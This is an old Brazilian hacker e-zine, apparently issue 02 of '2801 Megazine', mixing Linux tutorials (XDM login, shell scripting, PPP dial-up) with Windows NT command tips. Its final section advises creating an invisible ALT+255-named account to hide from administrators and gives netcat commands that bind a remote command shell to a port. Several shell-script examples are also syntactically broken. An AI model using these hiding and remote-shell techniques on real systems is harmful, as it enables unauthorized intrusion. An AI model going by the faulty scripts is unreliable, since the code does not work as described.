@@ -1,0 +1,1631 @@
+        *****************************************************
+        **[===============================================]**
+        **| 222222222   888888888   000000000    11111    |**
+        **|22       22  88     88   00     00   11  11    |**
+        **|         22  88     88   00     00  11   11    |**
+        **|        22   88     88   00     00       11    |**
+        **|      22     888888888   00     00       11    |**
+        **|    22       88     88   00     00       11    |**
+        **|  22         88     88   00     00       11    |**
+        **| 2222222222  888888888   000000000   111111111 |**
+        **[===============================================]**
+        *****************************************************
+[2801 megazine numero 02]        Aproveitem que eh Free!!!
+
+mail>2801megazine@linuxbr.com.br   mail to :2801!!                       
+
+endereco >http://w3.to/2801megazine                       
+                   
+==============================================================================                 
+*************************||   *Members*   ||***********************************      
+                         ||===============||
+                         ||Cronix         ||
+                         ||The Pest       ||
+                         ||Senna Spy      ||
+                         ||Proteus        ||  <----- Novo membro
+                         ||Nothing Cool   ||  <----- Novo membro                                        ||===============||
+                         ||Horix          ||  <----- Novo membro
+                         ||_______________||
+
+-----------------------------
+Esclarecimentos aos leitores
+-----------------------------
+
+ Por falta de inspiracao e assunto um dos nossos members abandonou o
+grupo,Megatron disse q nao faria falta pois nos davamos conta do recado,eh
+uma pena mas ok,quando ele tiver novos textos ele mandarah para nos e
+teremos o ,maior prazer em publicarmos...
+ Isso serve para qualquer pessoa normal q queira escrever algo para o zine
+basta entrar em contato conosco, na sala 2801 da uol apartir da 00:00h todos
+os dias de segunda a segunda :).AEEEEEEEEE bem vindo aos novos integrantes 
+e espero q fiquem aki ateh o fim..A eu sou o Newbie, q mudei de nick para Cronix 
+(na  verdade eu jah usava esse nick mas estava com doh de me desfazer do Newbie
+:( )mas continuarei escrevendo ,correndo atras dos outros
+integrantes,pentelhando,programando,hackiando...ops :)
+ Temos a participacao esse mes de alguns amigos nossos..o Terminal Crasher,
+ Vampire Hunter...quem quiser participar basta ter uma boa ideia e um bom
+texto... :)
+ Com certeza esse zine estarah melhor q os anteriores e os que vierem
+estarao melhor q seus antecessores e assim por diante.Cada dia q passa
+aprendemos mais lendo,estudando,fazendo,errando e acertando tmb..
+ Por favor se vc estah lendo esse zine esperando apenas truques,pode ir
+parando por aki pois antes de tudo esse zine tem o interecesse de abordar a
+informatica em geral, desde como configurar e otmizar seu sistema ateh como
+instalar uma backdoor,se vc eh dakeles q diz "bah q bando de lammahs"entao
+me desculpe mas esses textos nao eh para gurus..aaaa cansei de escrever,eh isso
+ ae espero q gostem e 
+ BOA VIAGEM!!
+|===========================================================================|
+||  100% Brasileiro    |       >INDICE<       |  ***  ***   |Sem fins      ||                
+||                     |        ^^^^^^        |   *    *    | Lucrativos   ||                 
+||  100% 2801Megazine  |                      |  ***  ***   |              ||
+||-------------------------------------------------------------------------||
+|| Inicializando  seu linux direto no X e criando uma tela de login        ||
+||-------------------------------------------------------------------------||
+|| Aprendendo a programar na shell                                         || 
+||-------------------------------------------------------------------------||
+|| Script para Verificacao de seu sistema                                  ||
+||-------------------------------------------------------------------------||
+|| Linux  &  Internet                                                      ||
+||-------------------------------------------------------------------------|| 
+|| Winnt by MSDOS                                                          ||
+||-------------------------------------------------------------------------||
+|| Backdoors I   (remocao)                                                 ||
+||-------------------------------------------------------------------------||
+|| Backdoors II  (info)                                                    ||
+||-------------------------------------------------------------------------||
+|| Backdoors III  (instalacao)                                             ||
+||-------------------------------------------------------------------------||
+||                                                                         ||
+||-------------------------------------------------------------------------||
+||                                                                         || 
+|===========================================================================|
+ Bom todo mes eu vou por umas dicas para usuarios de linux,sao textos longos
+e q demorei horas e dias para escreve los e me custou algumas reinstalacoes
+:( . Espero q goste se jah sabe nao critique por ser basicas e se nao sabe
+tente aprender ou absorver algo de bom delas.Esse papo de o Linux ser um
+sistemas operacional para hackear e para aprontar peraltices ;) estah deixando
+muito neginho sem conhecer por completo esse puta OS
+                                                                       
+----------------------------------------------------------------------
+Inicializando o X automaticamente ao ligar e criar uma tela de login X 
+                                     By Cronix
+-----------------------------------------------------------------------
+bom sempre para iniciar o ambiente X,vc usou o startx mas e que tal jah
+iniciar seu linux no X e com um login X tmb?para isso vc precisarah do XDM
+(X Display Manager),um meio de controlar uma sessao do X.Ele inicia
+automaticamente o X server e apresenta uma janela de login grafico o meu
+Linux hoje roda assim,isso de ter de executar o X manualmente eh coisa de
+pobre ;)
+
+O XDM eh executado a partir do xdm.Embora demore um pouco para se acostumar
+ao xdm,prefira ele ao startx/xint q vc usa ateh hoje....isso pq o startx q
+para quem nao sabe roda o xinit,exige q vc acesse uma tela de texto e entao
+inicialize  o X (via startx).O Xdm permite a entrada direto para uma sessao
+X.
+Para configurar o xdm, vc precisa editar pelo menos um arquivo do sistema
+trata -se de um arquivo basico usado quando se inicializa o Linux,entao eh
+um negocio serio mexer nele,eu recomendo fazer um back up antes de edita lo cas
+merda....
+       ---------------------------
+         Niveis de execucao UNIX
+       ---------------------------
+ O xdm geralmente aciona o q chamamos de run-level,ou nivel de execucao
+ Com algumas execoes,um nivel de execucao em linux/unix eh um conceito
+arbitrario q na maioria das vezes segue as tradicoes milenares do UNIX..
+o nivel de execucao simplifica um sistema autonomo de monousuario nao eh o
+meu caso...e duvido q muitos o use assim
+ No LINUX o nivel de exeucao 1 e superior eh multiusuario.isto significa q
+mais q um usuario tem a permicao de se logar.Em muito sistemas, o nivel de
+execucao 3 inicia a rede.Esse tmb eh o nivel de execucao padrao Linux.
+ O linux tmb tem niveis de execucao especiais para a falta de energia (q
+encerra o sistema) e o vulcanico (ctrl+alt+del)
+
+para sacar melhor isso de uma olhada em /etc/inittab, q vc verah uma das
+primeiras entradas serah algo parecido com;
+
+# Default runlevel.
+Id:3:initdefault:
+
+isso significa q o nivel de execucao padrao do seu sistema eh 3.logo mais em
+baixo no mesmo /etc/inittab vc encontrarah;
+
+ x1;4:wait:/etc/rc.d/rc.4
+isso eh declarado na entrada para o nivel de execucao 4,/etc/rc.d/rc.4
+esse arquivo entao iniciarah o X Display Manager, q apresentarah a tao
+esperada tela de login no X
+ no meu redhat o /etc/rc.d/rc.4 inicializa isso aki:
+
+#tell the viewers whats goig to happen..
+echo "starting up X window System V.11 R.6...."
+
+#call the "xdm" program.
+exec /usr/X11R6/bin/xdm -nodaemon
+
+isso eh q inicializa o xdm.Para q o xdm funcione vc tem q editar como root o
+/etc/inittab e mudar a seguinte linha:
+
+id:3:initdefault:
+     para
+id:43:initdefault:
+
+e pronto!tudo o mais jah vem pre-configurado.talvez vc queira mudar a
+configuracao mas jah eh um bom comeco. :)
+
+Depois de efetuar estas mudancas, quando vc inicializar o Linux da proxima
+vez,ele iniciarah no nivel de execucao 4 ao inves do nivel 3.
+Ele  iniciarah o xdm assim pois eh isso q consta no arquivo /etc/rc.d/rc.4
+lembre q foi o arquivo q vc modificou neh o ze ;)
+
+ Antes de fazer tudo isso vale lembrar q vc DEVE fazer uma copia de
+seguranca do /etc/inittab.vc tmb deve testar o xdm antes de o sistema
+iniciar nele.Para testar o xdm vc pode digitar o seguinte comando como root
+para mudar o nivel de execucao para 4.Mas tenha saco pois esse comando eh
+meio lerdo :
+ # init 4
+
+ Isso o farah passar para o nivel de execucao 4...
+ Se vc configurar o seu arquivo .login ou o .profile para chamar
+automaticamente o startx quando fizer login,precisarah desativa lo se usar o
+xdm.Esses dois metodos para iniciar o X sao conflitantes.Saia do X e depois
+comente as linhas q vc acrecentou ao .login e ao .profile ,tipo:
+
+if ('tty'== '/dev/tty1') then
+#blah
+#startx
+
+endif
+ Apos isso vc deve ver uma tela de login grafico.aaaa antes de realmete
+mudar o /etc/inittab teste essas mudancas no nivel de execucao 4 com o
+comando lah de cima ;) Se ficar tudo ok pode mudar o /etc/inittab
+
+ Os arquivos de configuracao do xdm estao em /usr/lib/X11/xdm.Se v c quiser
+mudar a cor de fundo da telinha de login consulte o Xsetup_0 nesse mesmo
+diretorio.Provavelmente vc nao terah q mexer muito no /usr/lib/X11/xdm...
+ -------------------------------
+ Identificacao de Usuario no xdm
+ -------------------------------
+ Vc nao mexeu no /usr/lib/X11/xdm certo?ok mas talvez vc terah q mexer nos
+arquivos em seu diretorio home.Conforme o padrao, o xdm roda um arquivo
+chamado .xsession apartir do seu diretorio home, em vez do .xinitrc, q eh
+executado pelo startx.
+
+ Para criar o arquivo .xsession. vc pode copiar o .xinitrc para .xsession em
+seu diretorio home,depois modifique este arquivo assim com foi feito no
+.xinitrc lah em cima ;)
+
+ o meu .session ficou assim mas num livro q eu li o 'the unix administrators
+guide to X' estava diferente...nao vou por o do livro pois estah muito longe
+do meu micro entao vai o meu mesmo ;)
+---------[corte aki ou se mate]---------------------------------------------
+
+#!/bin/sh
+userresource=$HOME/ .Xresourses
+usermodmap=$HOME/ .Xmodemap
+sysresources=/usr/X11R6/lib/X11/xinit/ .Xresources
+sysmodmap=/usr/X11r6/lib/X11/xinit/ .Xmodmap
+
+#merge defaults and key maps
+
+if [ -f $sysresources ]; then
+ xrdb -merge $sysresources
+
+fi
+
+if [ -f $sysmodmap ]; then
+ xmodmap $sysmodmap
+
+fi
+
+if [ -f $userresource ]; then
+ xrdb -merge $usersresources
+
+fi
+
+if [ -f $usermodmap ]; then
+ xmodmap $usermodmap
+
+fi
+
+#inicia alguns programas legais
+xsetroot -solid SteelBlue
+
+#configuracoes da xterm
+#nao mexa se nao souber ;)
+xterm -geom 80x32+254+0 -ls &
+xterm -geom 80x32+0+250 -ls &
+oclock -geom -7 -7 &
+exec fvwm
+
+-------[ufa...corteaki]-----------------------------------------------------
+
+Vc pode optar por nao comecar o X ao ligar,poderah optar por inicializa lo
+quando acessar o sistema
+ --------------------------------------
+ Iniciando o X automaticamente no login
+ --------------------------------------
+
+ Se vc nao configurar o xdm,vai precisar digitar o startx depois do login
+para acessar o X e todos os aplicativos iniciados em seu arquivo .xinitrc .
+ Se vc nao quiser digitar o startx toda vez q acessar seu sistema e tiver
+certeza de que realmente quer executar o X quando iniciar o Linux poderah
+colocar o comando startx em seu arquivo .login ou .bash_profile (dependendo
+do shell q vc usa pode ser csh,bash).
+ Se fizer isso certifique se de que estah rodando somente a partir do
+console.De outro modo os arquivos .login e .bash_profile terao erro se forem
+executados apartir de outro lugar(como por exemplo um terminal virtual)
+ A maneira de verificar isso eh observando o rsultado do programa TTY.
+ Esse programa devolve o arquivo do dispositivo atual usado no seu terminal
+ Quando executado de uma janela shell xterm,o tty imprimirah algo como
+/dev/ttyp1 (para o primeiro dispositivo pseudoterminal)Mas quando executado
+a partir do console (do primeiro terminal virtual), o tty imprimirah
+/dev/tty1.Quando exexcutado a partir do segundo terminal imprimirah
+/dev/tty2 sendo q assim poderemos verificar o terminal /dev/tty1.
+ Para isso basta digitar tty antes de iniciar o X.
+ #tty
+/dev/tty1
+
+(use o valor q lhe foi devolvido, o tty1 foi soh um exemplo)
+
+ Armado com essas informacoes,vc pode editar seu arquivo .login (se vc usa o
+shell C,csh,como seu shell) acrecentando essas linhas:
+
+ if ('tty'=='/dev/tty')then
+ startx
+endif
+
+ Isso vai iniciar o X quando vc fizer o login no console.tmb eh possivel
+configurar sua identificacao para q se desligue o sistema(logout) quando
+sair do X.Eu deixei aki assim:Quando eu saio do X,jah saio do sistema
+tmb..gostou?Se vc gostou copie isso aki!
+
+if tty ('tty' == '/dev/tty1') then
+ startx
+ logout
+endif
+
+
+e eh isso ae...espero q aproveitem isso ae :)Esse testo demorou exatamente 
+8 dias para se feito e me custou 1 reinstalacao do meu linux!
+ faloooooooooowwww
+
+                 
+       
+==============================================================================
+Programing in Shell                                       by NXthing CXXL=
+                                                                 &
+ 98% Nothing Cool   2% Cronix                                  Cronix
+------------------------------------------------------------------------------
+
+Acredito q vc jah sabe o q eh shell. Shel eh como se fosse o command.com do DOS
+Neste artigo vc vai aprender a criar scripts em shell ou ao menos entede-los.
+
+Lets go!
+------------------------
+Declaragco de variaveis:
+------------------------
+
+Nota = 1                                          //variavel numerica
+String=TOi, lammah!T                             // variavel string
+
+Para usar variaveis vc precisa de um $(cifrao) antes da variavel
+
+echo = como no DOS serve para mostrar algo e tal....... Como:
+
+echo $string                  //irar mostrar a variavel string
+------------------
+COMANDOS
+------------------
+ ------
+  READ
+ ------
+read - Oh! Significa ler. Entao?
+
+Segue:
+echo SQuantos anos vc tem?T
+Read $idade
+echo "Vc tem" echo $idade
+------
+ TRAP
+------
+trap - isto espera q o usuario de um Ctrl-c
+----
+segue:
+trap "comando1; comando2; comando3;;"
+ ------
+  EXIT
+ ------
+exit - sai do script, exit [num] sai do sript retornando um valor mun de saida
+-----------
+ Case/esac
+-----------
+case usualmente eh usado para fazer menus, mas nao se limita a isto, pode ser u
+sado para procedimentos
+segue:
+case variavel in
+1) commando;;
+2)comando2;
+   comando2.2;;                         // o ultimo comando deve ser seguido de
+*)comando;;
+esac                                    //esac deve aparecer no fim do case
+
+------look this-----
+echo "O q deseja fazer?"
+echo (X)windows  (L)ocalizar  (S)air
+read acao
+case $acao in
+X)echo "Iniciando o Xwindows ...";
+    startx;;
+L)echo "Entre com o nome do arquivo!";
+   read nome;
+   whereis nome;;
+S)exit;;
+*)echo "Opcao invalida!"
+esac
+-------
+ IF/FI
+-------
+ Para controle do fluxo em scripts,um dos comandos eh o If
+---tipo-----------
+if [$var -gt 0]
+then
+ comandos...
+else
+ comandos..
+fi
+---------------
+ While/Done
+---------------
+tipo zoia soh
+#isso conta de 10 a 1
+#
+var_numerica=10
+while ["$var_numerica" -gt 0]
+do
+ echo $var_numerica
+ expr $var_numerica -1
+done
+
+--------
+ LOOPS  
+--------
+Hmmmmm.... Poder ser chamado de volta, ciclo....
+
+--------------
+loop repeat - sem muito a comentar
+segue:   
+repeat algo1 algo2 algo3
+--------------
+
+-------------
+loop for - Eh o mais utilizado , porem tem mais recursos e tal
+
+segue:   
+for variavel in valores
+do       
+comando  
+comando2 
+done     
+
+look this
+for contador in 1 2 3
+do       
+echo $contador
+done     
+
+Hmmmmmmmm... irah aparecer na tela
+1 (depois) 2 (depois) 3
+-----------
+SLEEP
+-----------
+Sleep -gera uma pausa
+sleep numero_de_segundos
+---------------------------------------
+Trabalhando com Expressoes
+---------------------------------------
+
+echo 1 + 2
+hmmmmmmmm.... isto nao eh possivel
+o uso correto eh:
+expr variavel [numero] operador variavel [nomero]
+expr 1 + 2
+exemplo:
+var =expr 4*5
+
+Os operadores sao:
++  = mais (adicao)
+-   = menos
+*  = multiplicacao
+/   = divisao
+^  = exponencial : 5 ^ 3 [cinco elevado ao cubo]
+-gt = maior
+-lt = menor
+-eq = igual
+-o = ou
+!= = diferente
+operadores q testam caracteristicas de um arquivo ou diretorio:
+-d = verdadeiro se o arquivo for um diretorio
+-e = verdadeiro se o arquivo existir
+-f = verdadeiro se o arquivo contem texto
+-o = verdadeiro se o usuario for dono
+-r = verdadeiro se o arquivo pode ser lido pelo usuario
+-w = verdadeiro se o arquivo pode ser alterado pelo o usuario
+-x = verdadeiro se o arquivo pode ser executado pelo o usuario
+-z = verdadeiro se o arquivo estiver vazio
+
+
+----look this----
+
+echo "Entre com um numero!"
+read n1  
+echo "Entre com outro numero!"
+read n2  
+  soma= n1 + n2
+  div = n1 / n2
+  sub = n1 - n2
+  mult = n1 * n2
+echo "A soma eh:" echo $soma
+echo "A divisao eh:" echo $div
+echo "A subtracao eh:" echo $sub
+echo "A multiplicacao eh:" echo $mult
+
+
+Aeeeeeeeeeeeeeeee......... Com isto se vc pensar um pouco ira saber como usar 
+Isso foi o basico se eu colocasse todas as rotinas possiveis eu nao iria perder meu
+tempo iria fazer um livro (hehe), mas, procure aprofundar mais.
+Hmmmmmmmmmm........... Ao memos com isto vc vai entender os scripts em shell q
+existem por ae... Conselho: corra atras de C++
+
+                 
+                 
+----------------------------------------------------------------------------------
+Verificando seu sistema.  By Cronix
+----------------------------------------------------------------------------------
+Ops..sou eu de novo...
+Bom todos sabem q o Linux eh um sistema altamente maleavel, q dificimente
+estarah configurado pra mim igualzinho para vc...e dificilmente vc para
+facilitar sua vida nao fara um script no bash!
+Bem para quem tah sem imaginacao aki vai a dica..
+para verificar os seus logs e alguns arquivos importantes...
+eh um exemplo de como pode ser usado,repare q nos usuarios (diretorio /home)
+os nomes sao ficticios  e por tanto semelhanca com o mundo real eh mera
+semelhanca ;)...AA ponham ele no diretorio raiz o "/" e nao no root!
+caso mudem de diretorio terao de alterar algumas coisas...bao eu vou nessa
+see yah!
+---------------------------------[olhe o exemplo]------------------------
+#criado em 15/09/98
+#mao na roda para os iniciantes
+#verifica o root
+#rode ele no "/"
+echo 'verificacao do root'
+cd root
+tail -10 .bash_history |more
+# sleep eh uma pausa
+sleep 5
+cd ..
+#verifica os usuarios
+echo 'verificacao dos usuarios'
+cd home
+cd Araci de Almeida
+tail -10 .bash_history |more
+sleep 5
+cd ..
+cd  Raul seixas
+tail -10 .bash_history |more
+tail -10 .bash_logout |more
+sleep 5
+cd ..
+cd ..
+cd etc
+#verifiquemos as configuracoes ;)
+echo 'passwd'
+cat passwd |more
+echo 'inetd'
+#olhe bem
+cat inetd.conf |more
+#veja se as ttys estao aceitando conexaode id=0 isso de default nao vem
+cat securetty |more
+echo 'sevicos'
+cat services |more
+finger
+sleep 2
+who
+echo 'verificacao encerrada tenha um bom dia!'
+#by Cronix
+----------------------------------------------------------------------------------
+Esse script eh a base de um outro com menu q eu fiz aki...
+Eu comecei por ele e fui desenvolvendo ateh ativar outros programas de
+verificacao,jah existentes...crie,e o desenvolva o maximo possivel
+tah ?bao falo ae,,       
+-------------------------------------------------------------------------------
+  By Cronix
+ 
+ Bom esse Zine quando eu comecei a pensar nele e formar o time 2801 passava em
+minha cabeca criar um zine para novatos,a principio no linux jah q eh um 
+sistema operacional relativamente chato para comecar a mexer nele.....
+ Eu mesmo sofri muito com isso e amigos meus q jah sao usuarios a mais tempo
+tmb sofreram com minha pentelhacao do tipo "Tio como faz isso?" "Tio como
+faz akilo"?....Mas o tempo passou e eu fui aprendendo alguma coisa, claro 
+lendo muito e principalmente mexendo ,experimentando (hehehe claro q jah
+reinstalei meu linux uma pah de vezes...)Numa dessas experiencias eu resolvi
+por o slack aki jah q todos falavam q o slack era melhor e tal...(eu nao
+achei,prefiro mais meu redhat nas condicoes q eu uso para outras o slack eh
+melhor mas isso eh texto para outro zine)Por ser chato de conecta lo a net
+eu resolvi colocar um texto aki sobre isso.Mas eu queria aquele texto e como
+jah escreveram um puta texto sobre isso resolvi coloca lo aki,jah q o unico
+esforco foi recorta lo e cola lo ;)
+
+ Linux e a Internet    retirado do manual... www.netdados.com.br/tlm.html 
+^^^^^^^^^^^^^^^^^^^           (leitura essencial para todo usuario de linux)
+
+By Hugo Cisneiro
+
+5.1.  Conectando-se por: CHAPM
+
+Bem, comecando, logue-se como root. Depois, edite o arquivo host.deny para:
+
+ALL: ALL 
+
+Isso fara com que seu sistema fique seguro e nao seja usado programas locais remotamente.
+Depois voce tera que permitir voce mesmo a usar os programas locais, entao, para iss edite o arquivo /etc/hosts.allow :
+
+ALL: 127.0.0.1
+
+Agora vamos determinar o Host de sua maquina, va no arquivo /etc/HOSTNAME e coloque um nome qualquer, por exemplo:
+
+wakko
+
+Vamos agora configurar o /etc/resolv.conf , edite ele e coloque assim:
+
+search servidor.com.br
+nameserver 200.255.27.0
+Onde, search e o domain da maquina a ser acessada e nameserver eh o DNS Primario
+Proximo passo sera editar o arquivo /etc/hosts e colocar o seguinte:
+
+127.0.0.1 localhost
+0.0.0.0   wakko
+
+Note se voce ter um enderego de IP Fixo, mude a linha "0.0.0.0 wakko"
+Outro arquivo: /etc/networks , edite-o assim:
+
+loopback  127.0.0.0
+localnet  0.0.0.0
+
+Agora vamos configurar o username e password. Crie o arquivo /etc/ppp/pap-secre
+
+dirk * PrettySecret
+
+Note que dirk sera o username e PrettySecret o password. Substitua-os com os respectivos username e password. Para Provedores que usam chap em vez de pap, o arquivo acima se chamar "/etc/ppp/chap-secrets". Finalmente, vamos criar o script que fara a conexao
+O nome do arquivo sera "/etc/ppp/chatscript":
+
+       TIMEOUT 5
+       \Z'\h'(u;\w'x'-\w'4'/2)'4'OK ATDT12345678
+     ABORT 'NO CARRIER'
+       ABORT BUSY
+       ABORT 'NO DIALTONE'
+       ABORT WAITING
+       TIMEOUT 45
+       CONNECT ""
+       TIMEOUT 5
+       "name:" ppp
+
+Note que na segunda linha voce tem que substituir "12345678" pelo numero a ser discado por vc.
+Agora vamos criar o script que executara tudo o que configuramos... A conexao!
+O arquivo (nome e diretsrio da sua escolha...) Edite assim:
+
+exec pppd connect \
+     'chat -v -f /etc/ppp/chatscript' \
+      -detach crtscts modem defaultroute \
+      user dirk \
+      /dev/modem 38400
+
+Nco se esqueca de substituir a quarta linha, palavra dirk por seu username.
+Prontinho, rode o script e vai-la!
+
+Obs: Estas instrugues foram TOTALMENTE tiradas do ISP-Hookup-HOWTO, duvidas naonos perguntem.. 
+   
+5.2.  Conectando-se por: Programa Minicom
+   
+Vamos configurar!
+  
+Primeiro, edite o arquivo "/etc/hosts" assim:
+   
+127.0.0.1 localhost
+0.0.0.0   wakko
+   
+Onde tem wakko vocj coloca o host de sua maquina.
+Agora vamos editar o arquivo "/etc/resolv.conf":
+   
+domain servidor.com.br
+nameserver 200.255.67.1
+   
+Onde tem domain, voce substitui pelo domain do provedor que vocj ira acessar.
+Onde tem nameserver, coloque o DNS Primario do seu provedor (Veja no Win95 :/).
+   
+Pronto, agora vamos a parte pratica... eeebaaa...
+Digite minicom. (Voce tera que ter o programa Minicom, claro)
+
+Naquela telinha, digite:
+    
+ATDP2345678: para modens de pulse
+ATDT2345678: para modens de tone.
+    
+Substitua o "2345678" pelo nzmero do telefone a ser discado.
+    
+Depois da conexao, o provedor vai fazer o processo de login(como sempre), 
+coloque seu username e seu password e vai-la! Conectado. Agora vamos sair do minicom sem desconectar
+vamos suspender o minicom(ALT A+J). Agora no prompt, digite:
+    
+pppd /dev/modem defaultroute
+    
+Isso estabelecera a conexao.
+    
+Pronto, agora voce pode usar os maravilhosos recursos que a Internet lhe oferece!!Quando voce acessar IRC, nao deixe de visitar o canal #linux no servidor irc.brasnet.org!!
+    
+Obs: Se voce quiser desconectar, no Slackware(nao sei se vem nos outros) tem um
+script chamado ppp-off que corta a conexao. Entao utilize eles para desconectarSe voce nao tiver, tente o velho comando do modem: ATH0
+  
+5.3.  Conectando-se por: pppd
+    
+1. Voce precisa ter instalado/configurado no seu kernel o suporte para TCP/IP,ppp, e etc...
+- Isto esta alem do escopo desta *receita*. Alim disso, voce precisa se certificar q possue o programa chat instalado Isto eh deixado com
+exercicio para o sofredor, digo, leitor :)
+
+2. Crie, caso ainda nco exista, um diretsrio /etc/ppp ;
+M
+3. Com seu editor de texto preferido, crie no diretsrio /etc/ppp um arquivo chamado opitons 
+com o seguinte conteudo:
+
+        /dev/modem
+        38400
+        modem
+        crtscts
+        lock
+        connect /etc/ppp/net-connect
+        asyncmap 0
+        defaultroute
+        noipdefault
+        mtu 576
+
+Obs.: 
+
+a) Va no diretsrio /dev e crie um link simbslico para a porta serial onde seu modem estah instalado.
+No meu caso, meu modem esta na COM2, portando: ln -s cua1 modem
+
+b) Mude o valor 38400 de acordo com a velocidade do seu modem ;
+
+c) Se o seu modem esta, por exemplo. em COM3-IRQ5, voce deve executar o comando
+setserial /dev/cua2 irq 5. Para que, neste caso, o seu modem seja reconhecido toda vez que
+voce iniciar o seu Linux, coloque esta linha no /etc/rc.d/rc.local ou o equivalente em seu sistema
+
+4.  Crie no diretsrio /etc/ppp um arquivo chamado net-connect, com o seguinte conteudo...
+
+        #!/bin/sh
+        /usr/sbin/chat -v -t 60 -f /etc/ppp/net-chat
+
+5. Execute o comando chmod 500 /etc/ppp/net-connect.
+
+6. No diretsrio /etc/ppp, crie um arquivo chamado net-chat, com o seguinte
+conteudo:
+
+        ABORT "BUSY"
+        ABORT "NO CARRIER"
+        ""    AT&F1&D1
+        OK    ATDT987654321
+        login: "aqui voce coloca seu username"
+        sword: "aqui voce coloca sua senha"
+
+Obs.: 
+a) Os comandos para o modem variam de acordo com o fabricante! O meu modem eh um
+USRobotics SportSter 28.8 interno. Se vocj possui um modem diferente, a string
+de inicializacao provavelmente nao eh "&f1&d1", tente colocar ATZ no lugar (eh o padrao).
+
+b) Troque ATDT por ATDP caso sua linha seja PULSE.
+
+c) 987654321 eh o numero do telefone do seu provedor
+
+d) As duas zltimas linhas sco os "prompts" que o seu provedor lhe da. A maioria
+dos provedores da essas duas strings. Tem provedor que eh um pouco diferente,
+vamos citar um exemplo (Algarnet). Para pedir o meu username, a string eh 
+"Username" ; para por minha senha, a string eh "Password" ; em seguida eu recebo 
+um terceiro prompt: "Algarnet>". Am eu digito "ppp" e entao o processo 
+de conexao comeca a estabelecer o protocolo. 
+Por isso, o meu arquivo net-chat termina assim:
+...
+                  name: "meu username"
+                  word: "minha senha"
+                  rnet> ppp
+...
+
+7. Execute o comando chmod 600 /etc/ppp/net-chat
+
+8. No diretorio /etc/ppp crie um arquivo chamado ppp-off, com o seguinte conteudo:
+
+        #!/bin/sh
+        kill -HUP pppd
+   
+9. Execute o comando chmod 755 /etc/ppp/ppp-off
+   
+10. No diretsrio /etc, edite o arquivo resolv.conf e acrescente/altere a seguinte
+linha:
+M   
+        nameserver aaaa.bbbb.cccc.dddd
+   
+Obs.:aaaa.bbbb.cccc.dddd i o DNS do seu provedor.
+   
+11. Parece que nco... mas acabou. Para se conectar, digite pppd
+  
+Se vocj quiser acompanhar o processo de conexao, simplesmente digite
+tail -f /var/log/messages
+   
+Quando vocj ver a mensagem "remote IP address...", tecle CTRL-C.
+Para verificar sua conexco, digite "ifconfig" e "route"
+Tente "pingar" alguns enderegos conhecidos.
+   
+12. Para desconectar, digite /etc/ppp/ppp-off
+   
+PS.: Qualquer coisa i soh dar um ps e depois um kill no n: do processo do pppd
+   Repito: Esta eh uma receita *minima*, supondo-se que voce estah em casa, sem qualquer outro micro por perto, sem placa de rede, sem nenhuma outa aspircaoo a nao ser sentir o prazer orgasmico de se conectar a Internet atraves do Linux, e fazer um ftp na unha!
+
+
+Boa sorte !
+
+E parem de usar o minicom para acessar a Internet p$o&^r*#r!@a$# !
+
+5.4.  Pegando e-mail via pop server no Linux
+
+Para pegar e-mail, e le-los com um leitor de e-mail (ex. pine), tenho aqui comigo um script.
+Para quem nao sabe, proceda assim:
+
+1. Crie o arquivo get-mail usando "touch get-mail" (sem aspas)
+2. Digite "chmod 755 get-mail" (sem aspas)
+3. Edite o arquivo com um editor de texto qualquer (ex. vi, pico)
+4. Dentro do arquivo, coloque as linhas:
+
+#!/bin/sh
+# Script pra pegar mails usando o popclient
+echo Easy-mail Script! acidmud@axur05.org
+echo The Linux Manual - http://www.netdados.com.br/tlm/
+echo ----------------------------------------------------
+echo -e "Digite seu login:"'\c'; read login;
+stty -echo; echo -e "Digite sua senha:"'\c'; read senha;
+stty echo; echo -e '\n'"Digite o seu pop server [ ex. mail.axur05.org ]:"'\c'
+read pop;
+echo -e "Direcionar mail para o arquivo:"'\c'; read arquivo;
+popclient -3 -u $login -p $senha -o $arquivo $pop
+
+5. Salve o arquivo, e quando estiver conectado, rode ele e siga as instrucoes
+==============================================================================
+NT by MSDOS    By HORIX
+
+=----------------------------------------------------------------------------=
+
+E ai galera? Bem fui convidado pelo cronix para escrever  a parte
+de NT aqui nesse Zine, ainda naum sei por que, pois nao manjo nada sobre NT. :c )
+
+Bem algumas coisa que eu acho bem curiosas no NT sao:
+
+ --=[Comandos via MSDOS.]=--
+
+ 1) -------------------- N E T   U S E R --------------------
+
+   - Alem de criar usuarios pelo User Manager, voce pode tb usar o comando   " Net User " sendo
+
+que os parametros do comando sao :
+
+NET USER [username [password | *] [options]] [/DOMAIN]
+         username {password | *} /ADD [options] [/DOMAIN]
+         username [/DELETE] [/DOMAIN]
+e alem de criar vc tb pode apagar.. :c )
+
+Caso vc queira criar um usuario crie ele com o nome de " " ( famoso
+ALT+255 ou ALT+288 se o adm for um mane ele nunca vera vc..
+outra tb muito boa e mais segura eh apagar o "Guest" e cria-lo novamente.
+
+------A T E N C A O------
+         -> Nunca use o comando -=[ /net user Administrator /delete]=-,
+pois senao o Administrator vai para o saco...  mas se o Adm for um bolha por favor faca isso.
+:c)
+
+Para mostrar todos os users da maquina digite:
+-=[ Net User  ]=- sem nenhum parametro.
+
+2) -------------------- N E T   S H A R E  --------------------
+
+    - Sabe quando vc quer compartilhar um pasta ou drive na sua maquina , vc tem que clicar com o
+
+direito  share ........
+  EH facil eh so usar o comando NET SHARE onde os parametros sao:
+
+NET SHARE sharename
+          sharename=drive:path [/USERS:number | /UNLIMITED]
+                               [/REMARK:"text"]
+          sharename [/USERS:number | /UNLIMITED]
+                    [/REMARK:"text"]
+          {sharename | devicename | drive:path} /DELETE
+ex:
+Se vc quiser deixar o drive  c: compartilhado.
+net share horix=c:\ /unlimited
+onde horix eh nome da share e /unlimited eh numeros de user que podem entrar no drive.
+para vc poder conectar-se a share digite
+\\www.microsoft.com.br\horix ( a barra eh invertida mesmo). E CLARO QUE VC DIGITA ISSO NO RUN...
+---------------------------------------------FIM DOS COMMANDO VIA MSDOS.------------------
+
+-=[ COMO RODAR O COMMAND.COM EM QUALQUER PORTA ]=-
+
+
+Imagine vc dando um telnet e caindo diretamente no command.com de qualquer Rwindows .. :c )
+isso eh possivel atraves do NC.
+O NC eh um programa que roda o command.com ou qualquer outro programa na porta que vc deseja.
+o parametro usado eh
+
+ para o Rwindons 9x
+                nc.exe -l -p 666 -t -e c:\command.com
+                onde 666 eh porta
+        para o Rwindons NT
+                nc.exe -l -p 666 -t -e cmd.exe
+                onde 666 eh porta
+
+
+
+Ai  GALERA POR ESSE ZINE EH TUDO ESPERO QUE VC USE ISSO PARA ALGUMA COISA SE VC FOR ESPERTO VC
+
